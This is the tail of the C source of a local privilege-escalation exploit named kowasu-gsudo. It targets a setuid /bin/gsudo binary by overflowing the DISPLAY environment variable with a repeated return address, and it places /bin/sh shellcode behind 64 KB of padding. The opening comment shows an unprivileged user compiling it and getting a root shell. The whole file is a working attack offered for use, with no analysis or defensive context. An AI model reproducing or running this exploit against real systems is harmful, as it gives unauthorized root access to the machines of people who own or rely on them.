 *  local@livecd ~$ gcc kowasu-gsudo.c -o kowasu-gsudo
 *  local@livecd ~$ whoami
 *  local
 *  local@livecd ~$ ./kowasu-gsudo
 *  0@livecd /home/local# whoami
 *  root
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define EIP          "\xb0\xb0\x01\x3f"
#define EIP_DISTANCE 26U

char shellcode[] = {
  0x31, 0xc0, 0x04, 0x18, 0x31, 0xdb, 0xcd, 0x7f, 0xeb, 0x1a, 0x5b, 0x31,
  0xc0, 0x88, 0x43, 0x07, 0x89, 0x5b, 0x08, 0x89, 0x43, 0x0c, 0x04, 0x07,
  0x8d, 0x4b, 0x08, 0x8d, 0x53, 0x0c, 0xcd, 0x7f, 0x31, 0xc0, 0xcd, 0x7f,
  0xe8, 0xe1, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
  0x68, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x58, 0x00
};
unsigned int shellcode_length = 57;

int main(void)
{
	/* Payload is large, because the arguments and environment start around
	 * 0x3f00XXXX and we need to pivot the address to remove the 0 byte.
	 * We do this by including a 64k nop sled in the payload.
	 */
	char payload[65536];
	char vector[8192]   = "DISPLAY=AAA";
	char * const arg[3] = { "/bin/gsudo", "meh", NULL };
	char * const env[3] = { payload, vector, NULL };

	memset(payload, 'A', sizeof(payload) - shellcode_length - 1);
	payload[sizeof(payload) - shellcode_length - 1] = 0;
	strcat(payload, shellcode);

	for (unsigned int i = 0; i < EIP_DISTANCE; i++)
		strcat(vector, EIP);

	execve("/bin/gsudo", arg, env);

	perror("execve()");
	exit(EXIT_FAILURE);
}
